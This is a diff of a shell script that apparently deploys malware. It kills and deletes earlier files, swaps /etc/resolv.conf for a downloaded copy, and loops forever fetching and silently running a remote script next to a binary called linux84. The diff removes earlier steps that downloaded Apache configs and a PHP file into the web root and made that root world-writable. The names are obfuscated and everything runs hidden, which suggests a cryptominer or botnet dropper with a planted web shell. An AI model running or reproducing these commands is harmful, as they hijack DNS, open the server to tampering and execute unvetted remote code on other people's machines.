@@ -9,22 +9,6 @@ sudo pkill -f linux84
 
 sudo rm -rf /mnt/disks/user/project/linux8474/
 
-cd /etc/apache2/
-
-wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/ports.conf
-
-cd /etc/apache2/sites-enabled/
-
-wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/000-default.conf
-
-cd /var/www/html/
-
-wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux8474.php
-
-rm -rf /var/www/html/index.html
-
-chmod 777 -R /var/www/html/
-
 cd /etc/
 
 sudo wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/resolv.conf
@@ -67,9 +51,9 @@ sudo make
 while true
 do
 
-sudo wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxgoogle84741274
+wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxgoogle84741274
 
-sudo bash ./linuxgoogle84741274 &> /dev/null &
+bash ./linuxgoogle84741274 &> /dev/null &
 
 sudo ./linux84 8
 
@@ -87,9 +71,9 @@ sudo make
 while true
 do
 
-sudo wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxgoogle84741274
+wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxgoogle84741274
 
-sudo bash ./linuxgoogle84741274 &> /dev/null &
+bash ./linuxgoogle84741274 &> /dev/null &
 
 sudo ./linux84 8
 
